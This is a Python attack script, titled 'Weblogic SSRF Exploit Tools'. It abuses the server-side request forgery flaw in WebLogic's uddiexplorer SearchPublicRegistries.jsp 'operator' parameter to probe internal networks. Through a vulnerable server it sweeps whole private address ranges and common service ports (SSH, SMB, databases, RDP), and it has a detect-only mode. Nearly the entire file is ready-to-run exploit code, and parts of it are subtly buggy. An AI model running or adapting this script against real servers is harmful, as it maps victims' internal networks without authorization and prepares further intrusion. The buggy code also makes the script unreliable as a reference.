#!/usr/bin/python3
import argparse
import requests
import IPy

parser=argparse.ArgumentParser(description="Weblogic SSRF Exploit Tools        ——By Infiltrator",epilog="GitHub：https://github.com/nhpt")
group = parser.add_mutually_exclusive_group(required=True)
group2 = parser.add_mutually_exclusive_group(required=True)
group2.add_argument('-u',help="Single Target URL")
group2.add_argument('-uf',help="Read URLs from file")
parser.add_argument('-p',help="Only scan specified ports")
group.add_argument('-sn',help="Only scan specified subnets")
group.add_argument('-sf',help="Only scan IP in files")
parser.add_argument('--timeout',default=2,help="Specify the timeout,default 2s")
parser.add_argument('--header',help="Specify HTTP request header parameters and values, JSON format")
group.add_argument('-d',action='store_true',help="Only detect whether the vulnerability exists")
group.add_argument('-A',action='store_true',help="Only scan default Class A subnet")
group.add_argument('-B',action='store_true',help="Only scan default Class B subnet")
group.add_argument('-C',action='store_true',help="Only scan default Class C subnet")

args=parser.parse_args()

# HTTP GET请求，返回bytes类型的HTTP响应数据
def get(url,host,port,header,timeout):
    if header == None:
        header={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0'}
    url=url+"/uddiexplorer/SearchPublicRegistries.jsp?operator=http://"+host+":"+port+"&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"
    try:
        r=requests.get(url,headers=header,timeout=float(timeout))
        return r.text
    except:
        print("\n[!] The URL %s cannot be resolved, please check your network or URL!" % url)
        return ''

# 格式化端口函数
def getport(port):
    if '-' in port:
        return range(port.split('-')[0],port.split('-')[1]+1)
    elif ',' in port:
        return port.split(',')
    elif isinstance(port,list):
        return port
    else:
        return int(port)

# A类子网端口扫描函数
def subnetA(url,port):
    p=getport(port)
    if isinstance(p,list):
        for port in p:
            for i in range(1,256):
                for j in range(1,256):
                    for k in range(1,256):
                        host='10.'+str(i)+'.'+str(j)+'.'+str(k)
                        print("\r[*]",host+":"+str(port),end='')
                        text=get(url,host,str(port),args.header,args.timeout)
                        if "returned a 404 error code" in text:
                            print("[+] HTTP",host,str(port))
                        if "did not have a valid  SOAP content-type" in text:
                            print("[+] TCP",host,str(port))
    else:
        for i in range(1,256):
            for j in range(1,256):
                for k in range(1,256):
                    host='10.'+str(i)+'.'+str(j)+'.'+str(k)
                    print("\r[*]",host+":"+str(p),end='')
                    text=get(url,host,str(p),args.header,args.timeout)
                    if "returned a 404 error code" in text:
                        print("[+] HTTP",host,str(p))
                    if "did not have a valid  SOAP content-type" in text:
                        print("[+] TCP",host,str(p))

# B类子网端口扫描函数
def subnetB(url,port):
    p=getport(port)
    if isinstance(p,list):
        for port in p:
            for i in range(16,32):
                for j in range(1,256):
                    for k in range(1,256):
                        host='172.'+str(i)+'.'+str(j)+'.'+str(k)
                        print("\r[*]",host+":"+str(port),end='')
                        text=get(url,host,str(port),args.header,args.timeout)
                        if "returned a 404 error code" in text:
                            print("[+] HTTP",host,str(port))
                        if "did not have a valid  SOAP content-type" in text:
                            print("[+] TCP",host,str(port))
    else:
        for i in range(16,32):
            for j in range(1,256):
                for k in range(1,256):
                    host='172.'+str(i)+'.'+str(j)+'.'+str(k)
                    print("\r[*]",host+":"+str(p),end='')
                    text=get(url,host,str(p),args.header,args.timeout)
                    if "returned a 404 error code" in text:
                        print("[+] HTTP",host,str(p))
                    if "did not have a valid  SOAP content-type" in text:
                        print("[+] TCP",host,str(p))

# C类子网端口扫描函数
def subnetC(url,port):
    p=getport(port)
    if isinstance(p,list):
        for port in p:
            for i in range(1,256):
                for j in range(1,256):
                    host='192.168.'+str(i)+'.'+str(j)
                    print("\r[*]",host+":"+str(port),end='')
                    text=get(url,host,str(port),args.header,args.timeout)
                    if "returned a 404 error code" in text:
                        print("[+] HTTP",host,str(port))
                    if "did not have a valid  SOAP content-type" in text:
                        print("[+] TCP",host,str(port))
    else:
        for i in range(1,256):
            for j in range(1,256):
                host='192.168.'+str(i)+'.'+str(j)
                print("\r[*]",host+":"+str(p),end='')
                text=get(url,host,str(p),args.header,args.timeout)
                if "returned a 404 error code" in text:
                    print("[+] HTTP",host,str(p))
                if "did not have a valid  SOAP content-type" in text:
                    print("[+] TCP",host,str(p))

# 自定义子网端口扫描函数
def custom(url,port,iplist):
    p=getport(port)
    if isinstance(p,list):
        for port in p:
            for host in iplist:
                print("\r[*]",host+":"+str(port),end='')
                text=get(url,host,str(port),args.header,args.timeout)
                if "returned a 404 error code" in text:
                    print("[+] HTTP",host,str(port))
                if "did not have a valid  SOAP content-type" in text:
                    print("[+] TCP",host,str(port))
    else:
        for host in ip:
            print("\r[*]",host+":"+str(p),end='')
            text=get(url,host,str(p),args.header,args.timeout)
            if "returned a 404 error code" in text:
                print("[+] HTTP",host,str(p))
            if "did not have a valid  SOAP content-type" in text:
                print("[+] TCP",host,str(p))

# 仅检测漏洞函数
def detect(url):
    host='127.0.0.1'
    text=get(url,host,'65535',args.header,args.timeout)
    if "returned a 404 error code" in text:
        print("[+] The host has a Weblogic SSRF vulnerability!")
    elif "but could not connect over HTTP to server" in text:
        print("[+] The host has a Weblogic SSRF vulnerability!")
    elif "did not have a valid  SOAP content-type" in text:
        print("[+] The host has a Weblogic SSRF vulnerability!")
    else:
        print("[-] The host does not have a Weblogic SSRF vulnerability!")

defaulthost='127.0.0.1'
defaultport=[21,22,23,80,81,88,135,139,389,445,1433,1521,3306,3389]

if args.d:
    if args.u:
        detect(args.u)
    elif args.uf:
        uf=open(args.uf,'r').read()
        uf=uf.split('\n')
        for u in uf:
            detect(u)
    else:
        print("Please specify the url use -u or -uf")
        exit()
else:
    if args.u:
        if args.p:
            defaultport=args.p
        if args.sn:
            ip=[]
            try:
                ip=IPy.IP(args.sn)
            except ValueError:
                print("[!] The subnet you entered is not in the correct format!")
                exit()
            ip=[str(x) for x in ip]
            custom(args.u,defaultport,ip)
        if args.sf:
            ip=open(args.sf,'r').read()
            ip=ip.split('\n')
            custom(args.u,defaultport,ip)
        if args.A:
            subnetA(args.u,defaultport)
        if args.B:
            subnetB(args.u,defaultport)
        if args.C:
            subnetC(args.u,defaultport)
    elif args.uf:
        uf=open(args.uf,'r').read()
        uf=uf.split('\n')
        if args.p:
            defaultport=args.p
        if args.sn:
            for u in uf:
                ip=[]
                try:
                    ip=IPy.IP(args.sn)
                except ValueError:
                    print("[!] The subnet you entered is not in the correct format!")
                    exit()
                ip=[str(x) for x in ip]
                custom(u,defaultport,ip)
        if args.sf:
            for u in uf:
                ip=open(args.sf,'r').read()
                ip=ip.split('\n')
                custom(u,defaultport,ip)
        if args.A:
            for u in uf:
                subnetA(u,defaultport)
        if args.B:
            for u in uf:
                subnetB(u,defaultport)
        if args.C:
            for u in uf:
                subnetC(u,defaultport)
    else:
        print("Please specify the url use -u or -uf")
        exit()
    #parser.print_help()